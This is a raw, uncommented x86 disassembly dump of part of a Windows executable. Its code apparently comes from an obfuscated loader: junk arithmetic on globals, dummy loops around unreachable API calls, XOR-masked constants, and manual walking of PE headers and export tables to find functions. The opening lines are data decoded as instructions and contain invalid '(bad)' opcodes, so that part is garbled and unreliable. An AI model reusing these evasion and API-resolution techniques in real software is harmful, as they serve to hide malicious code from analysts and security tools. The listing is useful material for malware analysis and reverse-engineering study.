  422401:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422402:	fiadd  DWORD PTR [ecx-0x423047c1]
  422408:	and    dl,BYTE PTR [edi-0x78]
  42240b:	cmp    esp,esi
  42240d:	(bad)  
  42240f:	lods   al,BYTE PTR ds:[esi]
  422410:	pmaxsw mm4,QWORD PTR [ebp+0xc17947a]
  422417:	push   edx
  422418:	loope  0x422407
  42241a:	mov    esi,DWORD PTR [ebp+ecx*1+0x3af7cef9]
  422421:	mov    dh,0xd2
  422423:	test   eax,0x29bce9bc
  422428:	mov    ds:0x3cace2fa,al
  42242d:	jp     0x422452
  42242f:	mov    dl,0xa2
  422431:	xchg   edi,eax
  422432:	std    
  422433:	and    ah,BYTE PTR [esi+0x5]
  422436:	sahf   
  422437:	cmp    eax,0x205636ae
  42243c:	mov    DWORD PTR [ebp-0x3b],edx
  42243f:	sub    DWORD PTR [bx+si+0x756],eax
  422444:	push   0x94f0df60
  422449:	ret    0xd5aa
  42244c:	add    BYTE PTR [ecx+0x1e],0x55
  422450:	cmc    
  422451:	retf   
  422452:	mov    eax,DWORD PTR [ecx+0x1368b5ba]
  422458:	jecxz  0x4223e2
  42245a:	xchg   ebx,eax
  42245b:	sar    BYTE PTR [eax+ebx*2],cl
  42245e:	mov    ah,0xa
  422460:	(bad)  
  422461:	rcr    DWORD PTR [ecx+0x40],1
  422464:	bound  esi,QWORD PTR [ebx+0x34]
  422467:	mov    dl,0x53
  422469:	xchg   esi,eax
  42246a:	in     eax,dx
  42246b:	pop    edi
  42246c:	jmp    0x3fcb:0x779ee23f
  422473:	inc    edx
  422474:	stc    
  422475:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422476:	push   ebp
  422477:	adc    ebp,DWORD PTR [edi]
  422479:	pushf  
  42247a:	(bad)  
  42247b:	and    edi,DWORD PTR [ebx+0x9]
  42247e:	jno    0x42246f
  422480:	mov    BYTE PTR [esp-0x4a84c24c],bh
  422487:	jmp    0x4224e2
  422489:	mov    fs,ecx
  42248b:	les    ebx,FWORD PTR [eax-0x2f43cf7c]
  422491:	mov    eax,ds:0x9751b61a
  422496:	mov    ebp,0x30558556
  42249b:	pop    ebp
  42249c:	(bad)  [edi+edi*8+0x75]
  4224a0:	fadd   st(6),st
  4224a2:	add    cl,ch
  4224a4:	mov    eax,ds:0x42a2ee
  4224a9:	push   DWORD PTR [eax]
  4224ab:	push   DWORD PTR ds:0x42a552
  4224b1:	push   DWORD PTR ds:0x42a2f6
  4224b7:	push   DWORD PTR ds:0x42a532
  4224bd:	push   DWORD PTR ds:0x42af72
  4224c3:	push   DWORD PTR [ebp-0x28]
  4224c6:	push   DWORD PTR [ebp-0x2c]
  4224c9:	mov    eax,DWORD PTR [ebp-0x14]
  4224cc:	call   eax
  4224ce:	pop    edi
  4224cf:	pop    esi
  4224d0:	leave  
  4224d1:	ret    
  4224d2:	push   ebp
  4224d3:	mov    ebp,esp
  4224d5:	sub    esp,0x34
  4224d8:	push   ebx
  4224d9:	adc    edx,DWORD PTR ds:0x42b1aa
  4224df:	push   esi
  4224e0:	movzx  ecx,BYTE PTR ds:0x42b1ea
  4224e7:	sbb    DWORD PTR ds:0x42b21a,ecx
  4224ed:	push   edi
  4224ee:	mov    DWORD PTR [ebp-0x10],0xf89f85a5
  4224f5:	and    DWORD PTR ds:0x42b1c6,0x0
  4224ff:	mov    ecx,DWORD PTR ds:0x42b1c6
  422505:	inc    ecx
  422506:	mov    DWORD PTR ds:0x42b1c6,ecx
  42250c:	cmp    DWORD PTR ds:0x42b1c6,0xd
  422513:	jg     0x422552
  422519:	jmp    0x422529
  42251e:	push   0x42b1ba
  422523:	call   DWORD PTR ds:0x42b2f6
  422529:	cmp    DWORD PTR ds:0x42b1c6,0xc
  422530:	jne    0x422545
  422536:	xor    ecx,ecx
  422538:	xor    ecx,DWORD PTR ds:0x42b1c6
  42253e:	inc    ecx
  42253f:	mov    DWORD PTR ds:0x42b1c6,ecx
  422545:	cmp    DWORD PTR ds:0x42b1c6,0x1b
  42254c:	jb     0x4224ff
  422552:	lea    eax,[ebp+0x14]
  422555:	mov    DWORD PTR [ebp-0x4],eax
  422558:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  42255f:	lea    eax,[ebp-0xc]
  422562:	mov    DWORD PTR ds:0x42b19e,0x11
  42256c:	cmp    DWORD PTR ds:0x42b19e,0x0
  422573:	je     0x4225cf
  422579:	cmp    DWORD PTR ds:0x42b19e,0x2
  422580:	jge    0x4225cf
  422586:	jmp    0x4225a3
  42258b:	push   0x42b1fa
  422590:	push   0x42b222
  422595:	push   DWORD PTR [ebp-0x28]
  422598:	push   0x42a03d
  42259d:	call   DWORD PTR ds:0x42b2fa
  4225a3:	cmp    DWORD PTR ds:0x42b19e,0x3
  4225aa:	jne    0x4225bd
  4225b0:	mov    esi,DWORD PTR ds:0x42b19e
  4225b6:	dec    esi
  4225b7:	mov    DWORD PTR ds:0x42b19e,esi
  4225bd:	mov    esi,DWORD PTR ds:0x42b19e
  4225c3:	dec    esi
  4225c4:	mov    DWORD PTR ds:0x42b19e,esi
  4225ca:	jmp    0x42256c
  4225cf:	mov    DWORD PTR [ebp-0x14],eax
  4225d2:	and    DWORD PTR ds:0x42b1f2,0x0
  4225dc:	jmp    0x4225ee
  4225e1:	mov    esi,DWORD PTR ds:0x42b1f2
  4225e7:	inc    esi
  4225e8:	mov    DWORD PTR ds:0x42b1f2,esi
  4225ee:	cmp    DWORD PTR ds:0x42b1f2,0x1a
  4225f5:	jae    0x422622
  4225fb:	cmp    DWORD PTR ds:0x42b1f2,0x2a
  422602:	jle    0x422622
  422608:	jmp    0x42261d
  42260d:	push   0x42b1ca
  422612:	push   0x42a18d
  422617:	call   DWORD PTR ds:0x42b2fe
  42261d:	jmp    0x4225e1
  422622:	mov    eax,DWORD PTR [ebp-0xc]
  422625:	mov    DWORD PTR ds:0x42b202,0x1d
  42262f:	cmp    DWORD PTR ds:0x42b202,0x0
  422636:	je     0x422692
  42263c:	cmp    DWORD PTR ds:0x42b202,0xb
  422643:	jbe    0x422692
  422649:	jmp    0x422664
  42264e:	push   DWORD PTR [ebp-0x28]
  422651:	push   0x8416
  422656:	push   0x42a285
  42265b:	push   DWORD PTR [ebp-0xc]
  42265e:	call   DWORD PTR ds:0x42b306
  422664:	cmp    DWORD PTR ds:0x42b202,0xc
  42266b:	jne    0x42267e
  422671:	mov    esi,DWORD PTR ds:0x42b202
  422677:	dec    esi
  422678:	mov    DWORD PTR ds:0x42b202,esi
  42267e:	xor    esi,esi
  422680:	add    esi,DWORD PTR ds:0x42b202
  422686:	dec    esi
  422687:	mov    DWORD PTR ds:0x42b202,esi
  42268d:	jmp    0x42262f
  422692:	mov    edx,DWORD PTR [ebp-0x14]
  422695:	xor    esi,ecx
  422697:	mov    ecx,0x75108ae
  42269c:	sbb    esi,0x78cf
  4226a2:	xor    eax,ecx
  4226a4:	add    eax,0x3272f5
  4226a9:	mov    DWORD PTR [edx],eax
  4226ab:	xor    eax,eax
  4226ad:	or     eax,DWORD PTR ds:0x42b2b6
  4226b3:	mov    eax,DWORD PTR [eax]
  4226b5:	and    DWORD PTR ds:0x42b1c2,eax
  4226bb:	mov    eax,ds:0x42a2ea
  4226c0:	mov    edx,DWORD PTR [ebp-0x4]
  4226c3:	movzx  esi,BYTE PTR ds:0x42b1b2
  4226ca:	adc    DWORD PTR ds:0x42b206,esi
  4226d0:	mov    eax,DWORD PTR [eax]
  4226d2:	add    eax,DWORD PTR [edx]
  4226d4:	and    DWORD PTR ds:0x42b1ee,ecx
  4226da:	mov    DWORD PTR [ebp-0x8],eax
  4226dd:	mov    esi,DWORD PTR [ebp+0x8]
  4226e0:	and    DWORD PTR ds:0x42b1b2,0x0
  4226ea:	jmp    0x4226fa
  4226ef:	mov    eax,ds:0x42b1b2
  4226f4:	inc    eax
  4226f5:	mov    ds:0x42b1b2,eax
  4226fa:	cmp    DWORD PTR ds:0x42b1b2,0x15
  422701:	jae    0x422746
  422707:	cmp    DWORD PTR ds:0x42b1b2,0x9
  42270e:	jbe    0x422746
  422714:	jmp    0x422729
  422719:	push   0x42a26b
  42271e:	push   0x0
  422720:	push   DWORD PTR [ebp-0x28]
  422723:	call   DWORD PTR ds:0x42b30e
  422729:	cmp    DWORD PTR ds:0x42b1b2,0x8
  422730:	jne    0x422741
  422736:	mov    eax,ds:0x42b1b2
  42273b:	inc    eax
  42273c:	mov    ds:0x42b1b2,eax
  422741:	jmp    0x4226ef
  422746:	mov    eax,ds:0x42a472
  42274b:	mov    DWORD PTR ds:0x42b21e,0x16
  422755:	cmp    DWORD PTR ds:0x42b21e,0x0
  42275c:	je     0x42278f
  422762:	cmp    DWORD PTR ds:0x42b21e,0x19
  422769:	jbe    0x42278f
  42276f:	jmp    0x42277d
  422774:	push   DWORD PTR [ebp-0x20]
  422777:	call   DWORD PTR ds:0x42b316
  42277d:	mov    edx,DWORD PTR ds:0x42b21e
  422783:	dec    edx
  422784:	mov    DWORD PTR ds:0x42b21e,edx
  42278a:	jmp    0x422755
  42278f:	mov    eax,DWORD PTR [eax+0x198]
  422795:	movzx  edx,WORD PTR ds:0x42b18e
  42279c:	xor    edx,DWORD PTR ds:0x42b1d6
  4227a2:	mov    DWORD PTR ds:0x42b18e,edx
  4227a8:	xor    esi,ecx
  4227aa:	and    DWORD PTR ds:0x42b1c2,0x42b1b2
  4227b4:	mov    edx,0x3272f5
  4227b9:	add    DWORD PTR ds:0x42b1ce,0x42b1c2
  4227c3:	add    esi,edx
  4227c5:	mov    DWORD PTR ds:0x42b1be,0x75ce
  4227cf:	cmp    DWORD PTR [eax],esi
  4227d1:	je     0x4227e8
  4227d7:	mov    eax,DWORD PTR [eax]
  4227d9:	mov    DWORD PTR ds:0x42b18e,0x18de
  4227e3:	jmp    0x422b4e
  4227e8:	mov    eax,DWORD PTR [ebp+0x18]
  4227eb:	mov    esi,DWORD PTR ds:0x42b1ee
  4227f1:	adc    DWORD PTR ds:0x42b212,esi
  4227f7:	mov    esi,DWORD PTR [ebp+0x1c]
  4227fa:	or     ebx,0xffffffff
  4227fd:	mov    DWORD PTR ds:0x42b21a,0x5f57
  422807:	cmp    eax,0x70941f95
  42280c:	mov    DWORD PTR ds:0x42b19e,0x397d
  422816:	jne    0x422857
  42281c:	mov    DWORD PTR ds:0x42b196,0x41c1
  422826:	cmp    esi,ebx
  422828:	mov    DWORD PTR ds:0x42b18e,0x6f0
  422832:	jne    0x422857
  422838:	mov    DWORD PTR ds:0x42b1e6,0x1213
  422842:	push   ebx
  422843:	push   0x70941f94
  422848:	mov    DWORD PTR ds:0x42b1ea,0x77db
  422852:	jmp    0x422b3d
  422857:	mov    eax,DWORD PTR [ebp+0x18]
  42285a:	mov    esi,DWORD PTR [ebp+0x1c]
  42285d:	mov    DWORD PTR ds:0x42b1f6,0x6621
  422867:	cmp    eax,0x70941f94
  42286c:	jne    0x422899
  422872:	mov    DWORD PTR ds:0x42b1d2,0x1239
  42287c:	cmp    esi,ebx
  42287e:	mov    DWORD PTR ds:0x42b1ea,0x2737
  422888:	jne    0x422899
  42288e:	push   ebx
  42288f:	push   0x70941f97
  422894:	jmp    0x422b3d
  422899:	mov    eax,DWORD PTR [ebp+0x18]
  42289c:	mov    esi,DWORD PTR [ebp+0x1c]
  42289f:	cmp    eax,0x70941f97
  4228a4:	jne    0x4228c7
  4228aa:	mov    DWORD PTR ds:0x42b1ba,0x121e
  4228b4:	cmp    esi,ebx
  4228b6:	jne    0x4228c7
  4228bc:	push   ebx
  4228bd:	push   0x70941f96
  4228c2:	jmp    0x422b3d
  4228c7:	mov    eax,DWORD PTR [ebp+0x18]
  4228ca:	mov    DWORD PTR ds:0x42b202,0x572d
  4228d4:	mov    esi,DWORD PTR [ebp+0x1c]
  4228d7:	cmp    eax,0x70941f96
  4228dc:	mov    DWORD PTR ds:0x42b1aa,0x369b
  4228e6:	jne    0x42291d
  4228ec:	cmp    esi,ebx
  4228ee:	jne    0x42291d
  4228f4:	mov    DWORD PTR ds:0x42b18a,0xe5c
  4228fe:	push   ebx
  4228ff:	mov    DWORD PTR ds:0x42b22e,0x5e71
  422909:	push   0x70941f99
  42290e:	mov    DWORD PTR ds:0x42b1d6,0x2b39
  422918:	jmp    0x422b3d
  42291d:	mov    DWORD PTR ds:0x42b1da,edi
  422923:	mov    esi,DWORD PTR [ebp+0x18]
  422926:	mov    eax,0x5593
  42292b:	mov    edi,DWORD PTR [ebp+0x1c]
  42292e:	mov    eax,0x70941f98
  422933:	mov    DWORD PTR ds:0x42b1a2,0x1ef3
  42293d:	cmp    esi,eax
  42293f:	mov    DWORD PTR ds:0x42b1be,0x2a6e
  422949:	jne    0x422b21
  42294f:	cmp    edi,ebx
  422951:	mov    DWORD PTR ds:0x42b19e,0x8e7
  42295b:	jne    0x422b21
  422961:	sbb    DWORD PTR ds:0x42b1ea,0x3412
  42296b:	mov    eax,DWORD PTR [ebp+0x10]
  42296e:	or     edi,edi
  422970:	xor    eax,ecx
  422972:	sbb    DWORD PTR ds:0x42b1c2,edx
  422978:	add    eax,edx
  42297a:	mov    DWORD PTR [ebp-0x20],eax
  42297d:	mov    eax,DWORD PTR [ebp+0xc]
  422980:	mov    esi,DWORD PTR [ebp-0x8]
  422983:	xor    eax,ecx
  422985:	add    eax,edx
  422987:	imul   eax,DWORD PTR [esi]
  42298a:	mov    esi,DWORD PTR [ebp+0x8]
  42298d:	xor    esi,ecx
  42298f:	add    esi,edx
  422991:	cmp    esi,eax
  422993:	mov    eax,DWORD PTR [ebp-0x4]
  422996:	mov    edi,0xffcd8d0b
  42299b:	je     0x4229ba
  4229a1:	mov    esi,DWORD PTR [ebp-0x20]
  4229a4:	add    DWORD PTR [eax],esi
  4229a6:	mov    eax,DWORD PTR [ebp-0x4]
  4229a9:	mov    esi,DWORD PTR [ebp+0xc]
  4229ac:	xor    esi,ecx
  4229ae:	add    esi,edx
  4229b0:	imul   esi,DWORD PTR [eax]
  4229b3:	mov    DWORD PTR [eax],esi
  4229b5:	jmp    0x4229bf
  4229ba:	mov    esi,DWORD PTR [ebp+0x14]
  4229bd:	xor    DWORD PTR [eax],esi
  4229bf:	mov    eax,DWORD PTR [ebp-0x4]
  4229c2:	mov    esi,DWORD PTR [ebp+0x10]
  4229c5:	xor    esi,ecx
  4229c7:	sub    edi,esi
  4229c9:	add    DWORD PTR [eax],edi
  4229cb:	mov    eax,DWORD PTR [ebp-0x4]
  4229ce:	mov    esi,DWORD PTR [ebp-0x8]
  4229d1:	add    esi,DWORD PTR [eax]
  4229d3:	mov    DWORD PTR [ebp-0x8],esi
  4229d6:	mov    eax,DWORD PTR [ebp+0xc]
  4229d9:	mov    esi,DWORD PTR [ebp+0xc]
  4229dc:	xor    esi,ecx
  4229de:	xor    eax,ecx
  4229e0:	lea    eax,[eax+esi*1+0x64e5ea]
  4229e7:	mov    esi,DWORD PTR [ebp+0xc]
  4229ea:	xor    esi,ecx
  4229ec:	add    esi,edx
  4229ee:	imul   eax,esi
  4229f1:	mov    esi,DWORD PTR [ebp+0xc]
  4229f4:	xor    esi,ecx
  4229f6:	sub    esi,eax
  4229f8:	mov    eax,DWORD PTR [ebp-0x4]
  4229fb:	add    esi,edx
  4229fd:	cmp    DWORD PTR [eax],esi
  4229ff:	mov    eax,DWORD PTR [ebp-0x4]
  422a02:	mov    esi,DWORD PTR [ebp+0x10]
  422a05:	jg     0x422a1b
  422a0b:	xor    esi,ecx
  422a0d:	mov    edi,0xffcd8d0b
  422a12:	sub    edi,esi
  422a14:	add    DWORD PTR [eax],edi
  422a16:	jmp    0x422a21
  422a1b:	xor    esi,ecx
  422a1d:	add    esi,edx
  422a1f:	add    DWORD PTR [eax],esi
  422a21:	mov    eax,DWORD PTR [ebp-0x8]
  422a24:	mov    esi,DWORD PTR [ebp-0x10]
  422a27:	mov    eax,DWORD PTR [eax]
  422a29:	xor    esi,ecx
  422a2b:	add    esi,0x3272f4
  422a31:	mov    DWORD PTR [ebp-0x28],0x7097b860
  422a38:	mov    DWORD PTR [ebp-0x24],ebx
  422a3b:	not    esi
  422a3d:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  422a44:	mov    DWORD PTR [ebp-0x2c],ebx
  422a47:	mov    ebx,DWORD PTR [ebp-0x28]
  422a4a:	mov    edi,DWORD PTR [ebp-0x24]
  422a4d:	and    eax,esi
  422a4f:	mov    esi,0xa141
  422a54:	xor    bx,si
  422a57:	mov    esi,0x412c
  422a5c:	add    bx,si
  422a5f:	cmp    WORD PTR [eax],bx
  422a62:	je     0x422aac
  422a68:	mov    edi,DWORD PTR [ebp-0x10]
  422a6b:	xor    edi,ecx
  422a6d:	mov    DWORD PTR [ebp-0x28],0x7097b860
  422a74:	mov    DWORD PTR [ebp-0x24],0xffffffff
  422a7b:	mov    ebx,0xffcd8d0b
  422a80:	sub    ebx,edi
  422a82:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  422a89:	add    eax,ebx
  422a8b:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  422a92:	mov    edi,DWORD PTR [ebp-0x28]
  422a95:	mov    ebx,DWORD PTR [ebp-0x24]
  422a98:	mov    ebx,0xa141
  422a9d:	xor    di,bx
  422aa0:	add    di,si
  422aa3:	cmp    WORD PTR [eax],di
  422aa6:	jne    0x422a68
  422aac:	mov    edi,DWORD PTR [ebp-0x14]
  422aaf:	mov    edi,DWORD PTR [edi]
  422ab1:	mov    ebx,DWORD PTR [eax+0x3c]
  422ab4:	lea    edi,[ebx+edi*8+0x78]
  422ab8:	mov    edi,DWORD PTR [edi+eax*1]
  422abb:	mov    DWORD PTR [ebp-0x18],edi
  422abe:	mov    edi,DWORD PTR [ebp+0x8]
  422ac1:	xor    edi,ecx
  422ac3:	add    edi,edx
  422ac5:	mov    DWORD PTR [ebp-0x1c],edi
  422ac8:	mov    edi,DWORD PTR [ebp+0x8]
  422acb:	xor    edi,ecx
  422acd:	mov    ecx,DWORD PTR [ebp-0x18]
  422ad0:	add    edi,edx
  422ad2:	cmp    ecx,edi
  422ad4:	je     0x422b16
  422ada:	mov    ecx,DWORD PTR [ebp-0x18]
  422add:	add    ecx,eax
  422adf:	mov    DWORD PTR [ebp-0x1c],ecx
  422ae2:	mov    ecx,DWORD PTR [ebp-0x30]
  422ae5:	mov    edx,DWORD PTR [ebp-0x2c]
  422ae8:	mov    edx,0xa141
  422aed:	xor    cx,dx
  422af0:	mov    edx,DWORD PTR [ebp-0x1c]
  422af3:	mov    edx,DWORD PTR [edx+0xc]
  422af6:	add    cx,si
  422af9:	cmp    WORD PTR [eax+edx*1],cx
  422afd:	jne    0x422b16
  422b03:	mov    ecx,DWORD PTR ds:0x42a472
  422b09:	mov    ecx,DWORD PTR [ecx+0x198]
  422b0f:	mov    DWORD PTR [ecx],eax
  422b11:	jmp    0x422b4e
  422b16:	push   DWORD PTR [ebp+0x1c]
  422b19:	push   DWORD PTR [ebp+0x18]
  422b1c:	jmp    0x422b3d
  422b21:	mov    ecx,DWORD PTR [ebp+0x18]
  422b24:	mov    edx,DWORD PTR [ebp+0x1c]
  422b27:	cmp    ecx,0x70941f99
  422b2d:	jne    0x422b4e
  422b33:	cmp    edx,ebx
  422b35:	jne    0x422b4e
  422b3b:	push   ebx
  422b3c:	push   eax
  422b3d:	push   DWORD PTR [ebp+0x14]
  422b40:	push   DWORD PTR [ebp+0x10]
  422b43:	push   DWORD PTR [ebp+0xc]
  422b46:	push   DWORD PTR [ebp+0x8]
  422b49:	call   0x4224d2
  422b4e:	pop    edi
  422b4f:	pop    esi
  422b50:	pop    ebx
  422b51:	leave  
  422b52:	ret    0x18
  422b55:	push   ebp
  422b56:	mov    ebp,esp
  422b58:	and    esp,0xfffffff8
  422b5b:	sub    esp,0x3fc
  422b61:	or     DWORD PTR ds:0x42b1a6,0x42b1c2
  422b6b:	push   ebx
  422b6c:	xor    DWORD PTR ds:0x42b216,0x42b1b6
  422b76:	push   esi
  422b77:	push   edi
  422b78:	or     DWORD PTR ds:0x42b19e,0x42b192
  422b82:	lea    eax,[esp+0x1b8]
  422b89:	push   eax
  422b8a:	sub    DWORD PTR ds:0x42b222,0x377b
  422b94:	push   0x42a596
  422b99:	call   DWORD PTR ds:0x42b312
  422b9f:	mov    DWORD PTR ds:0x42b1ee,0x356c
  422ba9:	cmp    eax,0xffffffff
  422bac:	mov    DWORD PTR ds:0x42b1d6,0x3f42
  422bb6:	je     0x422bf9
  422bbc:	sub    DWORD PTR ds:0x42b206,0x3b29
  422bc6:	push   0x42a5ca
  422bcb:	adc    DWORD PTR ds:0x42b1a6,0xd7b
  422bd5:	push   0x89677644
  422bda:	adc    DWORD PTR ds:0x42b226,0x42b22a
  422be4:	call   DWORD PTR ds:0x42b2e2
  422bea:	mov    DWORD PTR ds:0x42b1da,0xf4c
  422bf4:	jmp    0x423de7
  422bf9:	and    DWORD PTR ds:0x42b202,0xcb9
  422c03:	mov    esi,DWORD PTR ds:0x42b302
  422c09:	add    DWORD PTR ds:0x42b21e,0x42b22a
  422c13:	push   0xf
  422c15:	lea    eax,[esp+0x44]
  422c19:	push   eax
  422c1a:	push   0x42a5de
  422c1f:	push   0x42a5f2
  422c24:	mov    DWORD PTR ds:0x42b19a,0x6718
  422c2e:	push   0x42a616
  422c33:	add    DWORD PTR ds:0x42b1fe,0x42b1be
  422c3d:	call   esi
  422c3f:	imul   eax,eax,0x300000
  422c45:	cmp    eax,0x1b00000
  422c4a:	mov    DWORD PTR ds:0x42b1a6,0x2dc4
  422c54:	je     0x422c6b
  422c5a:	xor    eax,eax
  422c5c:	mov    DWORD PTR ds:0x42b18e,0x4419
  422c66:	jmp    0x423de7
  422c6b:	add    DWORD PTR ds:0x42b19e,0x42b1e6
  422c75:	lea    eax,[esp+0x78]
  422c79:	or     DWORD PTR ds:0x42b1b2,0x1042
  422c83:	push   eax
  422c84:	add    DWORD PTR ds:0x42b1a6,0x42b1e2
  422c8e:	push   0xffffffff
  422c90:	xor    DWORD PTR ds:0x42b1be,0x42b22a
  422c9a:	call   DWORD PTR ds:0x42b30a
  422ca0:	test   eax,eax
  422ca2:	mov    DWORD PTR ds:0x42b192,0x385a
  422cac:	jne    0x422c5a
  422cb2:	and    DWORD PTR ds:0x42b1de,0x0
  422cbc:	jmp    0x422cce
  422cc1:	mov    edi,DWORD PTR ds:0x42b1de
  422cc7:	inc    edi
  422cc8:	mov    DWORD PTR ds:0x42b1de,edi
  422cce:	cmp    DWORD PTR ds:0x42b1de,0x1d
  422cd5:	jae    0x422d1a
  422cdb:	cmp    DWORD PTR ds:0x42b1de,0xe
  422ce2:	jg     0x422d1a
  422ce8:	jmp    0x422cf9
  422ced:	push   DWORD PTR [ebp-0x10]
  422cf0:	push   DWORD PTR [ebp-0x14]
  422cf3:	call   DWORD PTR ds:0x42b31a
  422cf9:	cmp    DWORD PTR ds:0x42b1de,0xd
  422d00:	jne    0x422d15
  422d06:	xor    edi,edi
  422d08:	or     edi,DWORD PTR ds:0x42b1de
  422d0e:	inc    edi
  422d0f:	mov    DWORD PTR ds:0x42b1de,edi
  422d15:	jmp    0x422cc1
  422d1a:	mov    DWORD PTR [esp+0x30],eax
  422d1e:	mov    ecx,0xf89c85a5
  422d23:	and    DWORD PTR ds:0x42b20e,0x0
  422d2d:	mov    edx,DWORD PTR ds:0x42b20e
  422d33:	inc    edx
  422d34:	mov    DWORD PTR ds:0x42b20e,edx
  422d3a:	cmp    DWORD PTR ds:0x42b20e,0x21
  422d41:	jl     0x422d73
  422d47:	jmp    0x422d66
  422d4c:	push   0x42b1a2
  422d51:	push   0x1a2f
  422d56:	push   0x42a26b
  422d5b:	push   0x42a000
  422d60:	call   DWORD PTR ds:0x42b31e
  422d66:	cmp    DWORD PTR ds:0x42b20e,0x13
  422d6d:	jb     0x422d2d
  422d73:	mov    DWORD PTR [esp+0x18],ecx
  422d77:	mov    ebx,DWORD PTR ds:0x42b28e
  422d7d:	mov    edx,DWORD PTR ds:0x42b2be
  422d83:	sub    edx,ebx
  422d85:	add    ebx,DWORD PTR [ebx+edx*1]
  422d88:	mov    DWORD PTR [esp+0xc],0xf89c85a2
  422d90:	mov    ebx,DWORD PTR ds:0x42b26a
  422d96:	xor    edx,edx
  422d98:	or     edx,DWORD PTR ds:0x42b2aa
  422d9e:	sub    ebx,edx
  422da0:	and    ebx,DWORD PTR [ebx+edx*1]
  422da3:	lea    eax,[esp+0x3c]
  422da7:	or     edi,0x6d65
  422dad:	mov    DWORD PTR [esp+0x30],eax
  422db1:	adc    DWORD PTR ds:0x42b212,0x17e9
  422dbb:	lea    eax,[esp+0x38]
  422dbf:	and    DWORD PTR ds:0x42b20a,0x0
  422dc9:	mov    edx,DWORD PTR ds:0x42b20a
  422dcf:	inc    edx
  422dd0:	mov    DWORD PTR ds:0x42b20a,edx
  422dd6:	cmp    DWORD PTR ds:0x42b20a,0xc
  422ddd:	jle    0x422e18
  422de3:	jmp    0x422df1
  422de8:	push   DWORD PTR [ebp-0x14]
  422deb:	call   DWORD PTR ds:0x42b322
  422df1:	cmp    DWORD PTR ds:0x42b20a,0xb
  422df8:	jne    0x422e0b
  422dfe:	mov    edx,DWORD PTR ds:0x42b20a
  422e04:	inc    edx
  422e05:	mov    DWORD PTR ds:0x42b20a,edx
  422e0b:	cmp    DWORD PTR ds:0x42b20a,0x12
  422e12:	jb     0x422dc9
  422e18:	mov    DWORD PTR [esp+0x20],eax
  422e1c:	xor    edx,edx
  422e1e:	add    edx,DWORD PTR ds:0x42b292
  422e24:	mov    eax,ds:0x42b29a
  422e29:	sub    eax,edx
  422e2b:	add    edx,DWORD PTR [edx+eax*1]
  422e2e:	mov    eax,ds:0x42a472
  422e33:	mov    eax,DWORD PTR [eax+0x1c8]
  422e39:	mov    eax,DWORD PTR [eax]
  422e3b:	adc    edi,0x4659
  422e41:	mov    edx,DWORD PTR [esp+0x20]
  422e45:	xor    ebx,ebx
  422e47:	mov    edi,0x75108ae
  422e4c:	adc    ebx,DWORD PTR ds:0x42b226
  422e52:	xor    eax,edi
  422e54:	mov    ebx,DWORD PTR ds:0x42b1d2
  422e5a:	sbb    ebx,DWORD PTR ds:0x42b1ca
  422e60:	mov    DWORD PTR ds:0x42b1d2,ebx
  422e66:	mov    ebx,0x3272f5
  422e6b:	add    eax,ebx
  422e6d:	mov    DWORD PTR ds:0x42b182,0x4af1
  422e77:	mov    DWORD PTR [edx],eax
  422e79:	mov    eax,ds:0x42b042
  422e7e:	cmp    eax,0x455dedfa
  422e83:	jne    0x422fd8
  422e89:	and    DWORD PTR ds:0x42b1c6,0x0
  422e93:	mov    eax,ds:0x42b1c6
  422e98:	inc    eax
  422e99:	mov    ds:0x42b1c6,eax
  422e9e:	cmp    DWORD PTR ds:0x42b1c6,0x9
  422ea5:	ja     0x422ede
  422eab:	jmp    0x422eb9
  422eb0:	push   DWORD PTR [ebp-0x18]
  422eb3:	call   DWORD PTR ds:0x42b326
  422eb9:	cmp    DWORD PTR ds:0x42b1c6,0x8
  422ec0:	jne    0x422ed1
  422ec6:	mov    eax,ds:0x42b1c6
  422ecb:	inc    eax
  422ecc:	mov    ds:0x42b1c6,eax
  422ed1:	cmp    DWORD PTR ds:0x42b1c6,0x17
  422ed8:	jb     0x422e93
  422ede:	mov    eax,DWORD PTR [esp+0x18]
  422ee2:	and    DWORD PTR ds:0x42b1ca,0x0
  422eec:	jmp    0x422f00
  422ef1:	xor    edx,edx
  422ef3:	add    edx,DWORD PTR ds:0x42b1ca
  422ef9:	inc    edx
  422efa:	mov    DWORD PTR ds:0x42b1ca,edx
  422f00:	cmp    DWORD PTR ds:0x42b1ca,0x11
  422f07:	jae    0x422f60
  422f0d:	cmp    DWORD PTR ds:0x42b1ca,0x7
  422f14:	ja     0x422f60
  422f1a:	jmp    0x422f41
  422f1f:	push   0x42a04a
  422f24:	push   DWORD PTR [ebp-0x18]
  422f27:	push   0x268e
  422f2c:	push   0x3495
  422f31:	push   0x4b1a
  422f36:	push   0x4d1d
  422f3b:	call   DWORD PTR ds:0x42b2ea
  422f41:	cmp    DWORD PTR ds:0x42b1ca,0x6
  422f48:	jne    0x422f5b
  422f4e:	mov    edx,DWORD PTR ds:0x42b1ca
  422f54:	inc    edx
  422f55:	mov    DWORD PTR ds:0x42b1ca,edx
  422f5b:	jmp    0x422ef1
  422f60:	mov    edx,DWORD PTR ds:0x42a472
  422f66:	add    DWORD PTR ds:0x42b20e,0x42b1fe
  422f70:	mov    edx,DWORD PTR [edx+0x198]
  422f76:	sbb    DWORD PTR ds:0x42b1aa,0x42b21e
  422f80:	xor    eax,edi
  422f82:	add    eax,ebx
  422f84:	sub    DWORD PTR ds:0x42b202,0x7175
  422f8e:	mov    DWORD PTR [edx],eax
  422f90:	sbb    DWORD PTR ds:0x42b1da,edi
  422f96:	mov    eax,DWORD PTR [esp+0x18]
  422f9a:	xor    eax,edi
  422f9c:	add    DWORD PTR ds:0x42b1f2,0x42b22a
  422fa6:	add    eax,ebx
  422fa8:	or     DWORD PTR ds:0x42b1c6,0x2272
  422fb2:	mov    ds:0x42b042,eax
  422fb7:	mov    eax,DWORD PTR [esp+0x18]
  422fbb:	xor    eax,edi
  422fbd:	adc    DWORD PTR ds:0x42b192,0x42b18e
  422fc7:	add    eax,ebx
  422fc9:	sbb    DWORD PTR ds:0x42b212,0x42b1b6
  422fd3:	mov    ds:0x42a56a,eax
  422fd8:	sub    DWORD PTR ds:0x42b1a6,edi
  422fde:	mov    eax,ds:0x42a472
  422fe3:	adc    DWORD PTR ds:0x42b1b2,0x42b206
  422fed:	mov    eax,DWORD PTR [eax+0x18c]
